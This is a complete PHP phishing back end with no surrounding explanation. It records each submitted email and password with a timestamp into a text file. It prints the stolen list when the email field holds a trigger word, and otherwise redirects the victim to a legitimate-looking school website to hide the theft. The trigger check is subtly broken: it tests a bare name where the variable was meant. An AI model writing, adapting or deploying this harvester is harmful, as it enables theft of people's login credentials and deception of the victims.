<?php

$pass=$_POST['password'];
$email=$_POST['email'];

$myfile = fopen("password.txt", "a") or die("Unable to open file!");
$txt = "email:".$email." \t "."password:".$pass." \t Date:".date("M,d,Y h:i:s A")."\n";
fwrite($myfile, $txt);
fclose($myfile);

if(email=="how"){
    $file = file_get_contents('password.txt', true);
    echo $file;
}else{
    
?>

<html>
<script type="text/javascript">
window.location.replace("http://www.hinhua.edu.my");
</script>
</html>

<?php
}
?>